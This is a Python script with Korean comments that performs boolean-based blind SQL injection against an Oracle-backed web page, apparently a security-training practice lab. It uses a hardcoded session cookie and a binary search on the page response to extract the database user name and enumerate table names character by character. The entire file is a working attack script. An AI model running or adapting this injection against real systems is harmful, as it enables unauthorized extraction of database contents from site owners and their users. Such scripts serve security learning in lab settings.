import requests

url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}"

cookies = {
    "JSESSIONID":"B607CAD128242EB95FF1069A03A8CF88"
    }
user = ""
def binarySearch(query):
    baseQuery = "(" + query + ")" + "> {}" # ( select length(user) from dual ) + > {}
    min = 1
    max = 127
    while min < max:
        avg = int((min + max) / 2)#범위가 1~100까지 인데 내가 찾고자 하는게 70이면
        attackQuery = baseQuery.format(avg)        # ( select length(user) from dual ) + > avg
        attackUrl = url.format(attackQuery)
        response = requests.get(attackUrl, cookies=cookies)
        if "MacBook" in response.text:        #쿼리가 참이면 max바로 위로 좁혀감     
            min = avg + 1
            #print('macbook: min:{} max:{} avg:{}'.format(min, max, avg)) 디버깅
        else: # 쿼리가 거짓이면 max를 절반아래로 좁혀감
            max = avg            
            #print('else: min:{} max:{} avg:{}'.format(min, max,avg)) 디버깅
    return min
    
# 오라클
# select user from dual       
# 길이 select length(user) from dual
# 한글자씩 : select ascii(substr(user,1,1)) from dual

query = "select length(user) from dual"
userLength = binarySearch(query)
print("user 길이 : {}".format(userLength))

for i in range(1,userLength+1):    
    query = "(select ascii(substr(user,{},1)) from dual)".format(i)
    ascii = binarySearch(query)
    user = user + chr(ascii)
print("user : {}".format(user))

# 테이블명
# select table_name from user_tables
#1. 테이블 갯수
# select count(table_name) from user_tables
#2. 테이블을 1 row
# select table_name rownum as ln from user_tables where ln = 테이블 갯수
#3. 테이블 1 row의 길이
# select length(table_name) from (select table name rownum as ln from user_tables ) where ln = {}
#4. 테이블 1 row의 한글자씩
# select ascii(substr(table_name,{},1)) from (select table name rownum as ln from user_tables ) where ln = {}

query = "select count(table_name) from user_tables"
tableCount = binarySearch(query)
print("테이블 갯수 : {}".format(tableCount))
for i in range(1,tableCount+1):
    query = "select length(table_name) from (select table_name, rownum as ln from user_tables ) where ln = {}".format(i)
    tableLength = binarySearch(query)
    table = ""
    for j in range(1,tableLength+1):
        query = "select ascii(substr(table_name,{},1)) from (select table_name, rownum as ln from user_tables ) where ln = {}".format(j,i)
        ascii = binarySearch(query)
        table = table + chr(ascii)
    print("테이블 : {}".format(table))

